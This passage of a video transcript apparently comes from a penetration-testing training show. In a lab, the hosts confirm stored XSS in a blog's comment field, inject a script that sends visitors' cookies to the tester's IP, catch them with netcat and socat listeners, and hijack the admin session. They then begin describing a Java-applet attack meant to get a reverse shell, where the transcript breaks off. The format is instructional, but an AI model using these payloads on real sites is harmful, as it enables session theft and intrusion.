IP address\n192.168.219.1 and it's 57 fire that off.\n\n283\n00:14:43.729 --> 00:14:46.099\nIts a little faster than\nour Nmap scan was but\n\n284\n00:14:46.099 --> 00:14:48.740\nit's come up with some\ngreat information here.\n\n285\n00:14:50.120 --> 00:14:53.637\nI'll scroll through it,\nat the very top some interesting stuff.\n\n286\n00:14:53.637 --> 00:14:57.460\nLook, the XSS protection\nheader is not defined.\n\n287\n00:14:58.600 --> 00:15:02.450\nThat might be leading me to believe that\nthis might be vulnerable to cross side\n\n288\n00:15:02.450 --> 00:15:07.570\nscripting cuz that header is not\ndefined which is meant to be for\n\n289\n00:15:07.570 --> 00:15:08.700\nprotection against XSS attacks.\n\n290\n00:15:08.700 --> 00:15:12.130\nSo it says that this header can hint\n\n291\n00:15:12.130 --> 00:15:14.980\nto the user agent to protect\nagainst some forms of XSS.\n\n292\n00:15:14.980 --> 00:15:17.320\nSo it's letting you know this\nmight have that vulnerability,\n\n293\n00:15:17.320 --> 00:15:20.040\nyou might want to check\nthat as an attack vector.\n\n294\n00:15:20.040 --> 00:15:25.150\nSo now that we know that might be\nthe case, I'll open up IceWeasel yet\n\n295\n00:15:25.150 --> 00:15:28.089\nagain, and let's peruse to that page.\n\n296\n00:15:28.089 --> 00:15:35.645\n192.168.219.157, if I'm not mistaken.\n\n297\n00:15:35.645 --> 00:15:38.350\nAnd there we go,\nit's a blog site, very cool.\n\n298\n00:15:38.350 --> 00:15:39.830\nAll right, so it's my blog.\n\n299\n00:15:39.830 --> 00:15:43.825\nVery simple site, not unlike many sites\nthat you might have encountered just\n\n300\n00:15:43.825 --> 00:15:45.340\nperusing through the internet.\n\n301\n00:15:45.340 --> 00:15:47.020\nVery cool stuff so it just says my blog.\n\n302\n00:15:47.020 --> 00:15:50.660\nI've got a couple of links over here,\nhome, and admin.\n\n303\n00:15:50.660 --> 00:15:54.431\nAdmin seems promising,\nlet's take a look at that.\n\n304\n00:15:54.431 --> 00:15:56.755\nWe got ourselves a nice log in prompt so\n\n305\n00:15:56.755 --> 00:16:00.252\nthis would be the administrative\narea of this blog site.\n\n306\n00:16:00.252 --> 00:16:02.978\nIf I knew the credentials,\nI could log in and administer the site.\n\n307\n00:16:02.978 --> 00:16:06.709\nThat might be something I wanna do as\na bad actor or a penetration tester,\n\n308\n00:16:06.709 --> 00:16:07.340\nall right?\n\n309\n00:16:07.340 --> 00:16:08.250\nSo I'm gonna keep that in mind.\n\n310\n00:16:08.250 --> 00:16:11.340\nI'm gonna come back here.\n\n311\n00:16:11.340 --> 00:16:13.430\nAnd look at that.\n\n312\n00:16:13.430 --> 00:16:15.330\nBe the first to comment.\n\n313\n00:16:15.330 --> 00:16:17.790\nWell that sounds fun, let's do comments.\n\n314\n00:16:17.790 --> 00:16:18.470\n&gt;&gt; Let's do.\n&gt;&gt; All right, so\n\n315\n00:16:18.470 --> 00:16:20.660\nthis is where we're like, okay.\n\n316\n00:16:20.660 --> 00:16:23.632\nAs the penetration tester,\nI'm thinking to myself,\n\n317\n00:16:23.632 --> 00:16:26.869\nthis might have a vulnerability for\ncross site scripting.\n\n318\n00:16:26.869 --> 00:16:29.648\nSo I'm going to follow that rabbit trail.\n\n319\n00:16:29.648 --> 00:16:33.630\nSo I'm gonna go in here, I'm gonna say,\nokay, we've got a title area,\n\n320\n00:16:33.630 --> 00:16:35.450\nan author area, and then a text area.\n\n321\n00:16:36.960 --> 00:16:40.553\nI'm guessing that typically\nthat's going to be shown, and\n\n322\n00:16:40.553 --> 00:16:42.250\nwe can test this by doing it.\n\n323\n00:16:42.250 --> 00:16:48.882\nWe'll say title, testing, and author\nis tester and we'll just say testing.\n\n324\n00:16:48.882 --> 00:16:50.508\nLike that and submit the query.\n\n325\n00:16:51.983 --> 00:16:55.062\nNow we see in the comments there\nis one query that says testing but\n\n326\n00:16:55.062 --> 00:16:57.925\nthe title doesn't show up and\nthe author doesn't show up.\n\n327\n00:16:57.925 --> 00:16:59.810\nIt just shows the text.\n\n328\n00:16:59.810 --> 00:17:01.400\nSo I'm gonna stick with the text box,\n\n329\n00:17:01.400 --> 00:17:04.820\nthe actual comment box area itself,\nto put my code in.\n\n330\n00:17:04.820 --> 00:17:08.670\nAnd let's test if this thing is actually\nvulnerable to cross site scripting.\n\n331\n00:17:08.670 --> 00:17:11.430\nWe can do that pretty easily\nwith a very simple script.\n\n332\n00:17:11.430 --> 00:17:13.370\nJust a little HTML or, I don't know.\n\n333\n00:17:13.370 --> 00:17:14.170\nYeah, I think, it's HTML.\n\n334\n00:17:14.170 --> 00:17:17.250\nI'll just do a script first for\nJavaScript.\n\n335\n00:17:17.250 --> 00:17:20.720\nOpen script, like that.\n\n336\n00:17:20.720 --> 00:17:22.350\nAnd, oop, I'm sorry.\n\n337\n00:17:22.350 --> 00:17:23.640\nYeah, script.\n\n338\n00:17:23.640 --> 00:17:25.014\nAnd then, we'll say, alert.\n\n339\n00:17:26.351 --> 00:17:28.204\nOpen parentheses, open quotation.\n\n340\n00:17:28.204 --> 00:17:31.724\nAnd we'll just say testing like so.\n\n341\n00:17:31.724 --> 00:17:37.903\nClose that down and then,\nI think that's that and then slash.\n\n342\n00:17:37.903 --> 00:17:40.637\nOoh, I don't need that, where am I going?\n\n343\n00:17:40.637 --> 00:17:42.105\nNeed you, there we go.\n\n344\n00:17:42.105 --> 00:17:46.370\nAnd just close my script like that.\n\n345\n00:17:46.370 --> 00:17:50.200\nSo what I'm doing is I'm saying,\nI would like to, if this script runs,\n\n346\n00:17:50.200 --> 00:17:53.920\nit should pop up an alert box saying,\ntesting.\n\n347\n00:17:53.920 --> 00:17:56.000\nIf we're vulnerable to\ncross site scripting,\n\n348\n00:17:56.000 --> 00:17:58.330\nthat should work,\nif I typed it all correctly.\n\n349\n00:17:58.330 --> 00:18:00.420\nAnd I'll have to check my\ncode if it doesn't work.\n\n350\n00:18:00.420 --> 00:18:01.590\nSubmit.\nLook.\n\n351\n00:18:01.590 --> 00:18:03.800\nThere is a pop up box that says testing.\n\n352\n00:18:03.800 --> 00:18:06.770\nBingo.\nWe are cross site scripting golden.\n\n353\n00:18:06.770 --> 00:18:08.440\nThat allows us to be able to do that.\n\n354\n00:18:08.440 --> 00:18:12.070\nWe know that this site is\nvulnerable to this attack vector.\n\n355\n00:18:12.070 --> 00:18:13.560\nWe can do cross site scripting.\n\n356\n00:18:13.560 --> 00:18:14.660\nSo I can click OK.\n\n357\n00:18:14.660 --> 00:18:18.762\nNow every time comes to this site and\nthey go to that area,\n\n358\n00:18:18.762 --> 00:18:21.592\ntheir browser will fire off that code.\n\n359\n00:18:21.592 --> 00:18:22.810\nAnd I'll show you that.\n\n360\n00:18:22.810 --> 00:18:23.730\nHere's my Windows machine.\n\n361\n00:18:23.730 --> 00:18:26.390\nI'm a random Windows user\nhaving a good old time.\n\n362\n00:18:26.390 --> 00:18:28.730\nAw man, I gotta check my blog,\nit's lunch time.\n\n363\n00:18:28.730 --> 00:18:29.440\nI love that site.\n\n364\n00:18:29.440 --> 00:18:30.390\nThat guy is awesome.\n\n365\n00:18:30.390 --> 00:18:32.920\nThat chick is so cool,\nshe writes so many neat things.\n\n366\n00:18:34.130 --> 00:18:35.160\nThere we go.\n\n367\n00:18:35.160 --> 00:18:36.332\nThere's my site.\n\n368\n00:18:36.332 --> 00:18:37.510\nThere's some comments.\n\n369\n00:18:37.510 --> 00:18:38.700\nExcellent!\n\n370\n00:18:38.700 --> 00:18:39.770\nWhat's this?\n\n371\n00:18:39.770 --> 00:18:40.460\nTesting.\n\n372\n00:18:40.460 --> 00:18:41.030\nRight.\n\n373\n00:18:41.030 --> 00:18:42.945\nSo, there we go,\nit's just goes to show you.\n\n374\n00:18:42.945 --> 00:18:46.900\nThis is just random user surfing that\nsite, and their browser executes.\n\n375\n00:18:46.900 --> 00:18:47.490\nSo hit OK.\n\n376\n00:18:47.490 --> 00:18:50.870\nNow that we know that\neverything is working,\n\n377\n00:18:50.870 --> 00:18:53.370\nlet's actually do some\nnasty to this thing.\n\n378\n00:18:53.370 --> 00:18:54.640\n&gt;&gt; Can we stop for just one second?\n\n379\n00:18:54.640 --> 00:18:56.010\n&gt;&gt; Sure.\n&gt;&gt; And think about what you just did\n\n380\n00:18:56.010 --> 00:19:00.440\ncuz that was pretty impressive and I don't\nknow if everybody really caught that.\n\n381\n00:19:00.440 --> 00:19:04.790\nI mean, all you did was\nwrite a little bit of HTML.\n\n382\n00:19:04.790 --> 00:19:09.590\nA little script block,\nin a comment field on a blog.\n\n383\n00:19:09.590 --> 00:19:12.297\nAnd then, somebody else goes and\nthat was it, right?\n\n384\n00:19:12.297 --> 00:19:15.090\nI mean, you just submitted your comment.\n\n385\n00:19:15.090 --> 00:19:18.210\nThere was no real hacking involved or\nanything.\n\n386\n00:19:18.210 --> 00:19:21.470\nAnother completely different\nuser goes to that website, and\n\n387\n00:19:21.470 --> 00:19:25.090\ntheir browser interprets that\ncomment that you submitted.\n\n388\n00:19:25.090 --> 00:19:29.010\nSees, it's a script block,\nI'm supposed to make a popup box.\n\n389\n00:19:29.010 --> 00:19:31.800\nAnd so that's a pretty benign\nlittle script you wrote,\n\n390\n00:19:31.800 --> 00:19:33.870\nbut think if that was something worse.\n\n391\n00:19:33.870 --> 00:19:35.840\nIt was that easy, scary stuff.\n\n392\n00:19:35.840 --> 00:19:38.260\n&gt;&gt; Yeah, it is pretty scary\nwhen you think about it.\n\n393\n00:19:38.260 --> 00:19:41.860\nTo just be able to type some\ncode into their text box and\n\n394\n00:19:41.860 --> 00:19:43.550\nhave it execute on other\npeople's browsers.\n\n395\n00:19:43.550 --> 00:19:45.880\nThat's why this is so dangerous.\n\n396\n00:19:45.880 --> 00:19:48.230\nAnd very cool for us to be able to do.\n\n397\n00:19:48.230 --> 00:19:48.770\n&gt;&gt; Yeah, as a pen tester.\n\n398\n00:19:48.770 --> 00:19:50.331\n&gt;&gt; Yeah, yeah.\n&gt;&gt; It's definitely fun.\n\n399\n00:19:50.331 --> 00:19:53.937\n&gt;&gt; Yeah, all right, so\nnow that we noticed it's guilty of this,\n\n400\n00:19:53.937 --> 00:19:55.648\nlet's make it do something.\n\n401\n00:19:55.648 --> 00:19:59.627\nSo what I'm gonna do is I'm gonna\nhave it send me the session ID of\n\n402\n00:19:59.627 --> 00:20:01.626\nthe user that visits that page.\n\n403\n00:20:01.626 --> 00:20:04.700\nThat's probably a bad thing for them.\n\n404\n00:20:04.700 --> 00:20:07.280\nBecause, once I get this session\nID I can hijack the session.\n\n405\n00:20:07.280 --> 00:20:08.850\nSo let's do that.\n\n406\n00:20:08.850 --> 00:20:12.770\nAnd to do that we will just type\nin a bit of some scripting here.\n\n407\n00:20:12.770 --> 00:20:16.730\nWe'll do it just kinda like we did before,\njust differently as far as like,\n\n408\n00:20:16.730 --> 00:20:17.980\nwhat's in the script.\n\n409\n00:20:17.980 --> 00:20:20.260\nSo I'm gonna say script, like so.\n\n410\n00:20:20.260 --> 00:20:25.392\nI'm gonna say new image, like that.\n\n411\n00:20:25.392 --> 00:20:30.014\nAnd .src, and that's \"=http:\\\\, and\n\n412\n00:20:30.014 --> 00:20:34.050\nI'm gonna give it my IP address, 46.\n\n413\n00:20:34.050 --> 00:20:35.940\nBecause guess what?\n\n414\n00:20:35.940 --> 00:20:40.040\nI'm running a listener waiting for\nthings to come back in on that.\n\n415\n00:20:40.040 --> 00:20:41.750\nHow about that?\n\n416\n00:20:41.750 --> 00:20:42.656\nSo I can do that and\n\n417\n00:20:42.656 --> 00:20:46.720\nI'm gonna give it a port 9999 cuz\nthat's where I'm gonna run my listener.\n\n418\n00:20:46.720 --> 00:20:49.473\nAnd then I can just say\nbogus.php like that,\n\n419\n00:20:49.473 --> 00:20:52.900\nbecause I want it to be\na kinda php output here.\n\n420\n00:20:52.900 --> 00:20:58.420\nAnd I will say outputs equals\n\n421\n00:20:58.420 --> 00:21:03.710\nplus document.cookie and\n\n422\n00:21:03.710 --> 00:21:08.940\nthen a semicolon, yeah.\n\n423\n00:21:08.940 --> 00:21:10.121\nAnd then close my script.\n\n424\n00:21:12.178 --> 00:21:12.870\nThere we go.\n\n425\n00:21:12.870 --> 00:21:18.540\nSo what I'm doing is, I'm telling, create\na new image that's part of the script.\n\n426\n00:21:18.540 --> 00:21:20.820\nBut get that image from this website.\n\n427\n00:21:21.820 --> 00:21:23.990\nThat's where the whole I gotcha.\n\n428\n00:21:23.990 --> 00:21:26.990\nHere, allow me to check from\nother websites for images.\n\n429\n00:21:26.990 --> 00:21:27.880\nOr at least I'm trying to.\n\n430\n00:21:27.880 --> 00:21:30.420\nAnd it's on this port,\nand this is where it's at.\n\n431\n00:21:30.420 --> 00:21:35.951\nAnd yeah, pipe that cookie over here,\nof anybody that visits this site.\n\n432\n00:21:35.951 --> 00:21:36.952\n&gt;&gt; [LAUGH]\n&gt;&gt; Anybody does that,\n\n433\n00:21:36.952 --> 00:21:38.990\ngive me their cookie.\n\n434\n00:21:38.990 --> 00:21:39.840\nAnd then we end our scripts.\n\n435\n00:21:39.840 --> 00:21:42.707\nSo now we can submit our query.\n\n436\n00:21:42.707 --> 00:21:45.170\nAnd we see, there's our testing box.\n\n437\n00:21:45.170 --> 00:21:47.450\nWe notice that we're getting a third\nbulletpoint, nothing really there.\n\n438\n00:21:47.450 --> 00:21:51.060\nAnd I got nothing here cuz we\nhaven't fired up our listener first.\n\n439\n00:21:51.060 --> 00:21:52.991\nAnd then we'll move on from there.\n\n440\n00:21:52.991 --> 00:21:55.330\nSo let me get close or just minimize.\n\n441\n00:21:56.550 --> 00:21:59.780\nLet me start our listener here.\n\n442\n00:21:59.780 --> 00:22:03.151\nSo ncap, or I'm sorry, nc for\n\n443\n00:22:03.151 --> 00:22:07.570\nNetcat -nvlp 9999 and hit return.\n\n444\n00:22:07.570 --> 00:22:10.670\nAnd now we're just waiting for\nsomeone to visit the website.\n\n445\n00:22:10.670 --> 00:22:15.420\nAs soon as someone does visit the website,\nit will capture that information and\n\n446\n00:22:15.420 --> 00:22:18.030\nthen close the connection,\ncuz this is Netcat.\n\n447\n00:22:18.030 --> 00:22:22.870\nNetcat is probably not the best resource\nfor doing this, even though it will do it.\n\n448\n00:22:22.870 --> 00:22:25.030\nIt's just not the best,\n\n449\n00:22:25.030 --> 00:22:29.820\nbecause as soon as it receives\ninformation and gets that, it'll close.\n\n450\n00:22:29.820 --> 00:22:33.290\nSo once the session is done,\nit'll drop the connection.\n\n451\n00:22:33.290 --> 00:22:38.470\nSo what we probably wanna\ndo is use a session\n\n452\n00:22:38.470 --> 00:22:40.460\nthat stays open and\nwe can use socat for that.\n\n453\n00:22:40.460 --> 00:22:41.570\nSo I'm gonna kill this listener.\n\n454\n00:22:42.990 --> 00:22:45.420\nAnd I think that I might have\ntyped in my string wrong,\n\n455\n00:22:45.420 --> 00:22:47.490\nbut we'll play with that in just a second.\n\n456\n00:22:47.490 --> 00:22:48.150\nLet's do it this way.\n\n457\n00:22:48.150 --> 00:22:51.680\nLet's try, actually I wrote it down,\nha ha, cuz I'm smart.\n\n458\n00:22:51.680 --> 00:22:53.240\nBrowser redirect, let me cap that.\n\n459\n00:22:53.240 --> 00:22:55.632\nI wrote these in so we can copy and paste\nit and make it a little bit easier so\n\n460\n00:22:55.632 --> 00:22:57.257\nyou don't have to watch\nme type things wrongly.\n\n461\n00:22:59.670 --> 00:23:02.873\nCuz I always fat finger something.\n\n462\n00:23:02.873 --> 00:23:06.420\nSo that is the one, no,\nthat's not the one we want.\n\n463\n00:23:06.420 --> 00:23:07.790\nThat's the browser reader.\n\n464\n00:23:07.790 --> 00:23:09.720\nWhere's the other one?\n\n465\n00:23:09.720 --> 00:23:10.540\nHijack session.\n\n466\n00:23:10.540 --> 00:23:11.630\nCat hijack session.\n\n467\n00:23:11.630 --> 00:23:12.930\nThere we go.\n\n468\n00:23:12.930 --> 00:23:13.630\nThat's what we want.\n\n469\n00:23:13.630 --> 00:23:19.840\nSo I'm just gonna copy this, Here.\n\n470\n00:23:19.840 --> 00:23:24.169\nWell, first we need to get\nour socat string going.\n\n471\n00:23:24.169 --> 00:23:25.707\nCat socat string, so there's your command.\n\n472\n00:23:25.707 --> 00:23:29.583\nSocat tcp -listen,\nthe port you wanna listen on.\n\n473\n00:23:30.938 --> 00:23:36.860\nAnd then what IP address and then to\nfork it, so that way, it stays open.\n\n474\n00:23:36.860 --> 00:23:38.188\nI'll paste that there.\n\n475\n00:23:38.188 --> 00:23:39.300\nSo, now that's listening.\n\n476\n00:23:40.960 --> 00:23:43.270\nIf anybody browses that site,\n\n477\n00:23:43.270 --> 00:23:45.968\nI can show you that by going over here and\nbrowsing to the site.\n\n478\n00:23:45.968 --> 00:23:48.955\nSo, I can go to My Blog.\n\n479\n00:23:48.955 --> 00:23:56.879\nI go into where The Welcome is,\nget our testing page.\n\n480\n00:23:56.879 --> 00:24:00.680\nAnd you'll see stuff is\nstarting to come in on there.\n\n481\n00:24:00.680 --> 00:24:03.260\nSo, there's definitely where you\ncan see that's the Windows NT.\n\n482\n00:24:03.260 --> 00:24:05.770\nStarting to gather great information here.\n\n483\n00:24:05.770 --> 00:24:12.050\nSo now, we're just waiting for\na good user, to actually go to that site.\n\n484\n00:24:12.050 --> 00:24:17.134\nAnd which is interesting now because\nthis is how this one works is this VM is\n\n485\n00:24:17.134 --> 00:24:22.549\nset up so that a automatic admin user\nactually visits the pages periodically.\n\n486\n00:24:22.549 --> 00:24:24.440\nSo that you can listen for these things.\n\n487\n00:24:24.440 --> 00:24:25.940\nSo that's part of the trick for this.\n\n488\n00:24:25.940 --> 00:24:28.280\nI don't see them coming in yet, so.\n\n489\n00:24:28.280 --> 00:24:33.800\nI know it happens once every 90 seconds,\nor something like that, so let me do this.\n\n490\n00:24:34.950 --> 00:24:44.010\nLet me reopen IceWeasel Let's go to where\nit says test and be the first to comment.\n\n491\n00:24:45.640 --> 00:24:48.840\nThen lets copy and paste because\nI'm sure I fat fingered something.\n\n492\n00:24:50.350 --> 00:24:50.999\n&gt;&gt; It looked good.\n\n493\n00:24:50.999 --> 00:24:53.380\n&gt;&gt; It did look good but\nI just like to be sure.\n\n494\n00:24:54.580 --> 00:24:57.880\nIt's easy enough done,\nwe'll just copy that string.\n\n495\n00:24:59.160 --> 00:25:00.310\nPut that guy in there.\n\n496\n00:25:02.080 --> 00:25:04.250\nPaste, and we'll submit query.\n\n497\n00:25:04.250 --> 00:25:06.240\nCuz I'm sure I just forgot a character or\nsomething.\n\n498\n00:25:08.380 --> 00:25:08.940\nThere we go.\n\n499\n00:25:08.940 --> 00:25:10.540\nAnd now we're waiting.\n\n500\n00:25:10.540 --> 00:25:14.840\nWe did get this Session ID\nfrom Firefox Ice weasel.\n\n501\n00:25:14.840 --> 00:25:16.130\nThat was me.\n\n502\n00:25:16.130 --> 00:25:16.940\nNow we're just waiting.\n\n503\n00:25:16.940 --> 00:25:19.142\nSo I know that that code is working.\n\n504\n00:25:19.142 --> 00:25:24.510\nI visited that site, it came into my\nlistener because we did the redirect, and\n\n505\n00:25:24.510 --> 00:25:29.250\nit did give me the session ID, cuz there\nis the session ID right there, you see it.\n\n506\n00:25:29.250 --> 00:25:33.290\nPHP session ID and\nthen the value of that is.\n\n507\n00:25:33.290 --> 00:25:35.930\nSo that's we're looking for\nfrom the admin themselves.\n\n508\n00:25:35.930 --> 00:25:39.770\nAs soon as that comes through, we should\nbe able to capture that information.\n\n509\n00:25:39.770 --> 00:25:42.350\nAnd then we're gonna use\ncookies manager plus\n\n510\n00:25:42.350 --> 00:25:46.142\nto inject that session\nID into our session ID.\n\n511\n00:25:46.142 --> 00:25:48.990\nAnd then that should give us\naccess to that admin area.\n\n512\n00:25:48.990 --> 00:25:52.106\nJust basically waiting for that to happen.\n\n513\n00:25:52.106 --> 00:25:54.960\n&gt;&gt; Larry Lewis out there in the chatroom\nbrings up a good point too.\n\n514\n00:25:54.960 --> 00:25:59.700\nYou could have it encode cookie data,\nto request remote server, and\n\n515\n00:25:59.700 --> 00:26:01.450\ngrab it from server access logs.\n\n516\n00:26:01.450 --> 00:26:04.670\nReally when it comes to this\ntype of cross scripting attack.\n\n517\n00:26:04.670 --> 00:26:06.519\nHow creative can you get?\n\n518\n00:26:08.250 --> 00:26:11.590\nIs really what you're\nlimited to most as far as\n\n519\n00:26:11.590 --> 00:26:14.880\nbeing able to manipulate their browser and\nwhat they're doing.\n\n520\n00:26:14.880 --> 00:26:18.670\nHaving them reach out and\ngrab an image from us is very creative.\n\n521\n00:26:18.670 --> 00:26:19.860\nI like that.\n\n522\n00:26:19.860 --> 00:26:21.300\n&gt;&gt; All right, so\nfinally the data is coming in.\n\n523\n00:26:21.300 --> 00:26:22.130\nThere it goes right there.\n\n524\n00:26:22.130 --> 00:26:24.950\nSo we got some, it took forever for\nthat script to run apparently.\n\n525\n00:26:26.140 --> 00:26:29.953\nThis is it right here, you see agent\nMozilla, Gecko, Phantom, Safari,\n\n526\n00:26:29.953 --> 00:26:31.233\nthat's not my browser.\n\n527\n00:26:31.233 --> 00:26:36.115\nThat's not my Windows browser, so\nthat must be our other user, or\n\n528\n00:26:36.115 --> 00:26:38.830\nanother random user, should I say.\n\n529\n00:26:38.830 --> 00:26:41.880\nLet's see what that does for\nus, let's copy, well,\n\n530\n00:26:41.880 --> 00:26:43.090\nI'll take the latest one to come in.\n\n531\n00:26:43.090 --> 00:26:47.170\nThere goes another one,\nlet's copy that session ID right there.\n\n532\n00:26:47.170 --> 00:26:51.430\nAll right, I'm gonna say Copy, all right,\nnow I'm gonna bring up IceWeasel again.\n\n533\n00:26:51.430 --> 00:26:54.520\nAnd this is where we're gonna\nemploy that Cookies Manager Plus.\n\n534\n00:26:54.520 --> 00:26:58.730\nSo I just go to Tools Go\nto Cookies Manager+.\n\n535\n00:26:58.730 --> 00:27:01.930\nAnd you put in the search field there,\n\n536\n00:27:01.930 --> 00:27:06.540\njust look for the IP or\nthe website name of your target.\n\n537\n00:27:06.540 --> 00:27:07.620\nSo that's come through.\n\n538\n00:27:07.620 --> 00:27:08.720\nI can hit that.\n\n539\n00:27:08.720 --> 00:27:12.579\nAnd then you get this lovely little\nedit button once you find that\n\n540\n00:27:12.579 --> 00:27:15.520\nPHPSES ID that you're looking for\nand hit edit.\n\n541\n00:27:15.520 --> 00:27:20.254\nI come right in here and\nit says content, delete that and\n\n542\n00:27:20.254 --> 00:27:25.660\npaste right over it, and\nnow hit save and hit close.\n\n543\n00:27:25.660 --> 00:27:30.740\nAnd now, when I hit admin,\nlook at that, I was not prompted for\n\n544\n00:27:30.740 --> 00:27:33.920\nuser name and\npassword because apparently I've stolen\n\n545\n00:27:33.920 --> 00:27:37.100\nthe session ID of\nthe administrator of this machine.\n\n546\n00:27:37.100 --> 00:27:38.570\nSo that's how that works.\n\n547\n00:27:38.570 --> 00:27:43.061\nYou can just keep that listener open,\nstart grabbing session IDs and then,\n\n548\n00:27:43.061 --> 00:27:47.353\ncopy and paste them in the cookies\nmanager plus and see if you get access.\n\n549\n00:27:47.353 --> 00:27:50.717\n&gt;&gt; Keep trying till you find one that\nactually gets you at the access level\n\n550\n00:27:50.717 --> 00:27:51.238\nyou need.\n\n551\n00:27:51.238 --> 00:27:52.551\n&gt;&gt; That's exactly what we're looking for.\n\n552\n00:27:52.551 --> 00:27:53.838\n&gt;&gt; What a great attack.\n\n553\n00:27:53.838 --> 00:27:56.380\nI'm just going to do this one,\ncouple lines of code.\n\n554\n00:27:56.380 --> 00:28:00.210\nAnd then we're just gonna sit back and\nwait for the admin to visit the site.\n\n555\n00:28:00.210 --> 00:28:02.007\n&gt;&gt; Yeah, [LAUGH] I know.\n\n556\n00:28:02.007 --> 00:28:05.020\nIt's kinda like there's some\nmore magic to this, right?\n\n557\n00:28:05.020 --> 00:28:09.250\nNo, it's that simple, you just have\nto finagle some things, right.\n\n558\n00:28:09.250 --> 00:28:12.980\nI told I'm able to put code in well,\nthis is the code I want you to do.\n\n559\n00:28:12.980 --> 00:28:16.890\nI want you to get an image, and\nthat image is actually you giving me.\n\n560\n00:28:16.890 --> 00:28:20.810\nThere was no image cuz I put bogus PHP,\nthere's nothing there, right.\n\n561\n00:28:20.810 --> 00:28:24.470\nBut while you're at that,\nwhy don't you go ahead and throw a session\n\n562\n00:28:24.470 --> 00:28:28.780\nthis way cuz I got a listener opened\nup receiving that data on said port.\n\n563\n00:28:28.780 --> 00:28:31.478\nSo very very dangerous,\nobviously, to allow them.\n\n564\n00:28:31.478 --> 00:28:35.990\nAllows me to do the browser redirection,\nget information about the end users.\n\n565\n00:28:35.990 --> 00:28:40.110\nAs well as grab the session ID so\nI can a session hijack.\n\n566\n00:28:40.110 --> 00:28:43.460\n&gt;&gt; And for the pen test ]and\nto make sure if we were doing\n\n567\n00:28:43.460 --> 00:28:47.360\nthe pen test when we're at an\norganization, we found this kind of thing,\n\n568\n00:28:47.360 --> 00:28:50.550\nhow do they keep themselves\nsafe from this type of attack?\n\n569\n00:28:50.550 --> 00:28:54.490\nAs then you mentioned you're sanitizing\ninput, doing input validation,\n\n570\n00:28:54.490 --> 00:28:58.400\nis there really any reason\nthey should be able to\n\n571\n00:28:58.400 --> 00:29:01.630\nuse script blocks in\nyour comment field right.\n\n572\n00:29:01.630 --> 00:29:05.600\nThis is why do we really need them\nto be able to type out HTTP code or\n\n573\n00:29:05.600 --> 00:29:08.180\nHTML code I should say\nin that comment box.\n\n574\n00:29:08.180 --> 00:29:10.830\nI don't think so in most cases.\n\n575\n00:29:10.830 --> 00:29:12.480\n&gt;&gt; No.\nBut a lot of people like to do that\n\n576\n00:29:12.480 --> 00:29:16.820\nbecause then you can put cool URL\npictures and gifs from other sites and\n\n577\n00:29:16.820 --> 00:29:18.580\njust copy and paste the code in there.\n\n578\n00:29:18.580 --> 00:29:20.330\nAnd it shows up.\nYou didn't have to do anything,\n\n579\n00:29:20.330 --> 00:29:21.850\nyou just grab a URL.\n\n580\n00:29:21.850 --> 00:29:22.710\n&gt;&gt; Because we all got to have our\n\n581\n00:29:22.710 --> 00:29:24.720\nanimated icons in our signatures-\n&gt;&gt; It's a must have.\n\n582\n00:29:24.720 --> 00:29:26.010\n&gt;&gt; Otherwise we're not cool.\n\n583\n00:29:26.010 --> 00:29:27.800\n&gt;&gt; That's we got out of the trees man.\n\n584\n00:29:27.800 --> 00:29:28.876\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n585\n00:29:28.876 --> 00:29:30.189\n&gt;&gt; All right, so let's move on,\n\n586\n00:29:30.189 --> 00:29:31.621\nnow that we know how to do that.\n\n587\n00:29:31.621 --> 00:29:33.536\nLet's talk about client side attacks.\n\n588\n00:29:33.536 --> 00:29:35.830\nLet's further this a little more.\n\n589\n00:29:35.830 --> 00:29:39.960\nNow that was pretty devastating I'm\nnow able to login as the administrator\n\n590\n00:29:39.960 --> 00:29:45.170\nof that site, make changes like I can\nadd remove and that's pretty cool but\n\n591\n00:29:45.170 --> 00:29:49.440\nit's not give me administrative\nremote shell cool, right?\n\n592\n00:29:49.440 --> 00:29:51.620\nThat's the biscuit you're looking for\nright.\n\n593\n00:29:51.620 --> 00:29:52.960\nSo lets go there.\n\n594\n00:29:52.960 --> 00:29:54.130\nThat's with a client side attack.\n\n595\n00:29:54.130 --> 00:29:57.100\nSo what we're going to do is use some\nof the techniques that we just learned\n\n596\n00:29:57.100 --> 00:30:01.410\nto execute a client-side attack where,\nnot only do they execute code, but they\n\n597\n00:30:01.410 --> 00:30:04.110\nexecute some seriously malicious juju,\n&gt;&gt; [LAUGH]\n\n598\n00:30:04.110 --> 00:30:05.910\n&gt;&gt; That gives me a reverse shell.\n\n599\n00:30:05.910 --> 00:30:08.000\nThat's, that's what we're looking for.\n\n600\n00:30:08.000 --> 00:30:09.690\nSo let's see here.\n\n601\n00:30:09.690 --> 00:30:11.790\nWe're going to use browser\nredirection inside of this.\n\n602\n00:30:11.790 --> 00:30:16.200\nAnd this is gonna heavily rely on\nour ability to socially engineer\n\n603\n00:30:16.200 --> 00:30:17.800\nour end user, right?\n\n604\n00:30:17.800 --> 00:30:21.110\nBecause this is not the easiest\nthing to accomplish.\n\n605\n00:30:21.110 --> 00:30:25.180\nBecause people nowadays are a lot more\nskeptical by nature, when it comes to\n\n606\n00:30:25.180 --> 00:30:28.840\nthings that are popping up on their site,\nor my browser's acting a little weird.\n\n607\n00:30:30.030 --> 00:30:32.660\nAnd they might call tech support, right?\n\n608\n00:30:32.660 --> 00:30:33.730\nOr they just might not do it at all.\n\n609\n00:30:33.730 --> 00:30:34.540\nThey'll call tech support and\n\n610\n00:30:34.540 --> 00:30:37.510\nsay I'm getting this prompt asking me\nto run this thing, should I do that?\n\n611\n00:30:37.510 --> 00:30:39.060\nAnd they're gonna go, no.\n\n612\n00:30:39.060 --> 00:30:41.670\nSo we're gonna have to\nsocially engineer the user so\n\n613\n00:30:41.670 --> 00:30:46.520\nthat they will allow, at least my type of\nattack, what I'm gonna show you, to work.\n\n614\n00:30:46.520 --> 00:30:48.450\nSome of them will run without\nuser intervention, but\n\n615\n00:30:48.450 --> 00:30:49.930\nthings get a little weird.\n\n616\n00:30:49.930 --> 00:30:52.010\nSo I went with this,\ncuz it's a whole lot nicer.\n\n617\n00:30:52.010 --> 00:30:56.590\nSo what I've done is I've created\na Java applet that basically\n\n618\n00:30:56.590 --> 00:31:00.110\nsays download this code and execute it.\n\n619\n00:31:00.110 --> 00:31:00.650\nOkay.\n\n620\n00:31:00.650 --> 00:31:01.360\nPretty simple.\n\n621\n00:31:01.360 --> 00:31:02.340\nWhat is that code?\n\n622\n00:31:02.340 --> 00:31:07.570\nThe code is runcmd.exe and\nthen fire up a listener or\n\n623\n00:31:07.570 --> 00:31:10.630\nI'm 